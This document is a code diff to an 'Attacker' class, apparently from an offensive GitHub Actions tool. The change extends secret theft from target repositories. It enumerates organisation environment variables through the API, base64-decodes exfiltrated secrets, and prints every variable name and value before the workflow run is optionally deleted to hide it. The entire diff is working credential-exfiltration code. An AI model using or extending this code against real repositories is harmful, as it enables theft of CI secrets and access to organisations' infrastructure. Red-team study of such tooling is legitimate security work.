@@ -54,6 +54,7 @@ class Attacker:
         self.author_name = author_name
         self.timeout = timeout
         self.github_url = github_url
+        self.environmentsecrets = ""
 
     def __setup_user_info(self):
         if not self.user_perms:
@@ -120,7 +121,7 @@ class Attacker:
         cleartext = decryptor.update(ciphertext) + decryptor.finalize()
         cleartext = cleartext[:-cleartext[-1]]
 
-        return cleartext
+        return base64.b64decode(cleartext).decode("utf-8")
 
     def __collect_secret_names(self, target_repo):
         """Method to collect list of secrets prior to exifl.
@@ -136,12 +137,18 @@ class Attacker:
         secret_names = []
         repo_secret_list = self.api.get_secrets(target_repo)
         org_secret_list = self.api.get_repo_org_secrets(target_repo)
+        totalVars, org_variable_list = self.api.get_repo_org_variables(target_repo)
 
         if repo_secret_list:
             secrets.extend(repo_secret_list)
 
         if org_secret_list:
             secrets.extend(org_secret_list)
+        
+        if org_variable_list:
+            Output.owned(f"The repository has {Output.bright(totalVars)} "
+                         "accessible environment variable secrets!")
+            self.environmentsecrets = org_variable_list
 
         if not secrets:
             Output.warn(
@@ -155,8 +162,13 @@ class Attacker:
             )
 
         secret_names = [secret['name'] for secret in secrets]
-
+        
         return secret_names
+    
+    # def __collect_variable_names(self, target_repo):
+    #     org_variable_list = self.api.get_repo_org_variables(target_repo)
+    #     print("Org variable list: ", org_variable_list)
+    #     return org_variable_list
 
     def __execute_and_wait_workflow(
             self,
@@ -588,6 +600,12 @@ class Attacker:
                     Output.error(
                         "Unable to extract encoded output from runlog!"
                     )
+            
+            if self.environmentsecrets:
+                Output.owned("Secret environment variables from this repo:")
+                for variable in self.environmentsecrets:
+                    print("{}={}".format(variable["name"], variable["value"]))
+                print("")
 
             if delete_action:
                 res = self.api.delete_workflow_run(target_repo, workflow_id)
